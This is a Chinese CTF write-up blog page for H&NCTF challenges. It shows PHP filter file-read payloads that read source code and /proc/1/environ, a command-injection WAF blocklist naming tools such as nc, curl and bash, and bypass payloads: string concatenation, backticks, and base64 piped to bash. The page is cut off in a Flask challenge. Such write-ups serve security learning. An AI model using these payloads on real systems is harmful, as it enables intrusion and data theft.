
  <!DOCTYPE html>
  <html lang="en"  >
  <head>
  <meta charset="utf-8">
  

  

  

  
  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
  
  
  <title>
    H&amp;NCTF |
    
    Flight-star&#39;blog
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="没打算认真写，稍微写一点保持手感吧！！DeceptiFlag测试：根据提醒和抓包，我觉得应该就是xiyangyang 和 huitailang 怎么就是不行呢？ 康康源码：1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="H&amp;NCTF">
<meta property="og:url" content="http://example.com/2025/06/07/H-NCTF/index.html">
<meta property="og:site_name" content="Flight-star&#39;blog">
<meta property="og:description" content="没打算认真写，稍微写一点保持手感吧！！DeceptiFlag测试：根据提醒和抓包，我觉得应该就是xiyangyang 和 huitailang 怎么就是不行呢？ 康康源码：1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&amp;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20250607220227796-1749304948527-3.png">
<meta property="og:image" content="http://example.com/images/image-20250607215958303-1749304798950-1.png">
<meta property="og:image" content="http://example.com/images/image-20250607220804997-1749305285735-5.png">
<meta property="og:image" content="http://example.com/images/image-20250608164238814-1749372160276-1.png">
<meta property="og:image" content="http://example.com/images/image-20250608172830753-1749374911958-3.png">
<meta property="og:image" content="http://example.com/images/image-20250608211206428-1749388327138-5.png">
<meta property="og:image" content="http://example.com/images/image-20250608211800919-1749388682471-7.png">
<meta property="og:image" content="http://example.com/images/image-20250608211845908-1749388726660-9.png">
<meta property="og:image" content="http://example.com/images/image-20250608212759406-1749389280579-11.png">
<meta property="og:image" content="http://example.com/images/image-20250608213220020-1749389540702-13.png">
<meta property="article:published_time" content="2025-06-07T13:57:00.000Z">
<meta property="article:modified_time" content="2025-06-11T16:59:42.033Z">
<meta property="article:author" content="Flight-star">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20250607220227796-1749304948527-3.png">
  
  
    <link rel="alternate" href="/atom.xml" title="Flight-star'blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">

  
<meta name="generator" content="Hexo 7.3.0"></head>

  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
        </svg>
      </div>
      <div class="loading-word">少女祈祷中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/about">About</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/friend">Friend</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    
      <img fetchpriority="high" src="/images/banner.webp" alt="H&amp;NCTF">
    
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">H&amp;NCTF</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content">
          
          <section id="main"><article id="post-H-NCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2025/06/07/H-NCTF/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2025-06-07T13:57:00.000Z" itemprop="datePublished">2025-06-07</time>
    <time style="display: none;" id="post-update-time">2025-06-12</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id><a href="#" class="headerlink" title></a></h1><h5 id="没打算认真写，稍微写一点保持手感吧！！"><a href="#没打算认真写，稍微写一点保持手感吧！！" class="headerlink" title="没打算认真写，稍微写一点保持手感吧！！"></a>没打算认真写，稍微写一点保持手感吧！！</h5><h2 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a><code>DeceptiFlag</code></h2><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>根据提醒和抓包，<strong>我觉得应该就是<code>xiyangyang</code> 和 <code>huitailang</code></strong></p>
<p><strong>怎么就是不行呢？</strong></p>
<h3 id="康康源码："><a href="#康康源码：" class="headerlink" title="康康源码："></a>康康源码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;start&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">	&lt;img src=&quot;xh.jpg&quot; style=&quot;position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;&quot; alt=&quot;背景图&quot;&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; onsubmit=&quot;return prepareForm(this);&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;label&gt;你喜欢谁：&lt;/label&gt;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;qaq_visible&quot; required&gt;</span><br><span class="line">		&lt;div style=&quot;display:none;&quot;&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;Lang&quot; id=&quot;LangInput&quot;&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交验证&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function prepareForm(form) &#123;</span><br><span class="line">            const fiValue = form.qaq_visible.value;</span><br><span class="line">            form.action = &quot;?qaq=&quot; + encodeURIComponent(fiValue);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250607220227796-1749304948527-3.png" alt="image-20250607220227796"></p>
<p><strong>是不是少了<code>URL</code>部分?</strong></p>
<h3 id="经过不断测试："><a href="#经过不断测试：" class="headerlink" title="经过不断测试："></a>经过不断测试：</h3><p><img src="/../images/image-20250607215958303-1749304798950-1.png" alt="image-20250607215958303"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//27.25.151.198:48212/?qaq=xiyangyang</span></span><br><span class="line"></span><br><span class="line">qaq_visible=xiyangyang&amp;Lang=huitailang</span><br></pre></td></tr></table></figure>



<p>怎么突然弹出这个页面了！让<strong>我康康是否可以文件读取</strong>！</p>
<h3 id="文件读取："><a href="#文件读取：" class="headerlink" title="文件读取："></a>文件读取：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//27.25.151.198:48212/tips.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>

<p><strong>成功读取到源码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pahint&quot;</span>, <span class="string">&quot;L3Zhci9mbGFnL2ZsYWcudHh0&quot;</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;qaq&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;qaq&#x27;</span>] === <span class="string">&#x27;xiyangyang&#x27;</span> &amp;&amp;</span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Lang&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;Lang&#x27;</span>] === <span class="string">&#x27;huitailang&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;verified&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: tips.php&quot;</span>); </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: aicuo.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;start&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">	&lt;img src=<span class="string">&quot;xh.jpg&quot;</span> style=<span class="string">&quot;position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;&quot;</span> alt=<span class="string">&quot;背景图&quot;</span>&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return prepareForm(this);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;label&gt;你喜欢谁：&lt;/label&gt;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;qaq_visible&quot;</span> required&gt;</span><br><span class="line">		&lt;div style=<span class="string">&quot;display:none;&quot;</span>&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;Lang&quot;</span> id=<span class="string">&quot;LangInput&quot;</span>&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交验证&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">prepareForm</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="variable constant_">fiValue</span> = form.qaq_visible.value;</span><br><span class="line">            form.action = <span class="string">&quot;?qaq=&quot;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(fiValue);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//27.25.151.198:48212/tips.php?file=php://filter/read=convert.base64-encode/resource=/proc/1/environ</span></span><br></pre></td></tr></table></figure>

<p><strong>成功获取flag：</strong></p>
<p><img src="/../images/image-20250607220804997-1749305285735-5.png" alt="image-20250607220804997"></p>
<h1 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a><code>Really_Ez_Rce</code></h1><h3 id="考察点：代码审计"><a href="#考察点：代码审计" class="headerlink" title="考察点：代码审计"></a>考察点：<font color="red">代码审计</font></h3><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="绕过preg-match-d-inputNumber"><a href="#绕过preg-match-d-inputNumber" class="headerlink" title="绕过preg_match(&#39;/\d/&#39;, $inputNumber)"></a>绕过<code>preg_match(&#39;/\d/&#39;, $inputNumber)</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//27.25.151.198:30216/?Number[]=a</span></span><br></pre></td></tr></table></figure>



<h3 id="绕过：cmd的WAF"><a href="#绕过：cmd的WAF" class="headerlink" title="绕过：cmd的WAF"></a>绕过：<code>cmd</code>的WAF</h3><h4 id="测试：-1"><a href="#测试：-1" class="headerlink" title="测试："></a>测试：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=rev /f?g						<span class="comment">#失败，?被禁用</span></span><br><span class="line">cmd=rev /<span class="keyword">var</span>/log/nginx/access.log	<span class="comment">#失败，点被过滤</span></span><br></pre></td></tr></table></figure>





<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><h5 id="拼接绕过："><a href="#拼接绕过：" class="headerlink" title="拼接绕过："></a>拼接绕过：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd=a=l;b=s<span class="variable">$IFS</span>/;$a<span class="variable">$b</span></span><br><span class="line">    </span><br><span class="line">cmd=a=ca;b=t;c=se;d=d;e=di;f=r;$a<span class="variable">$b</span> /$($e<span class="variable">$f</span> -<span class="number">1</span> / | $c<span class="variable">$d</span> -n <span class="number">5</span>p)</span><br><span class="line">    </span><br><span class="line">   相当于：cmd=cat /$(dir -<span class="number">1</span> / | sed -n <span class="number">5</span>p)</span><br></pre></td></tr></table></figure>

<ol>
<li><code>dir -1 /</code> → 列出根目录每行一个文件</li>
<li><code>| sed -n 5p</code> → 选择第5行内容</li>
<li>结果插入<code>cat /$(...)</code> → 读取提取的文件</li>
</ol>
<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><h5 id="点撇绕过："><a href="#点撇绕过：" class="headerlink" title="点撇绕过："></a><code>点撇</code>绕过：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=l``s</span><br></pre></td></tr></table></figure>



<h4 id="法三："><a href="#法三：" class="headerlink" title="法三："></a>法三：</h4><p><code>base64</code>绕过:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmd=a=bas;b=e64;c=bas;d=h;<span class="keyword">echo</span> Y2F0IC9mKg | $a<span class="variable">$b</span> -d | $c<span class="variable">$d</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#相当于：</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IC9mKg → 输出Base64编码的命令</span><br><span class="line">| base64 -d → 解码为<span class="string">&quot;cat /f*&quot;</span></span><br><span class="line">| bash → 执行解码后的命令</span><br><span class="line">    </span><br><span class="line">   <span class="keyword">echo</span> Y2F0IC9mKg<span class="string">&quot;cat /f*&quot;</span>  | base64 -d | bash</span><br></pre></td></tr></table></figure>



<p>json</p>
<h2 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h2><h3 id="考察点：污染题"><a href="#考察点：污染题" class="headerlink" title="考察点：污染题"></a>考察点：<font color="red">污染题</font></h3><p>源码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, render_template_string, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&quot;customer&quot;</span>)</span><br><span class="line">        session[<span class="string">&#x27;permission&#x27;</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    error_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        error_message = <span class="string">&#x27;&lt;p style=&quot;color: red; font-size: 0.8em;&quot;&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    products = [</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;美式咖啡&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">9.99</span>, <span class="string">&quot;image&quot;</span>: <span class="string">&quot;1.png&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;橙c美式&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">19.99</span>, <span class="string">&quot;image&quot;</span>: <span 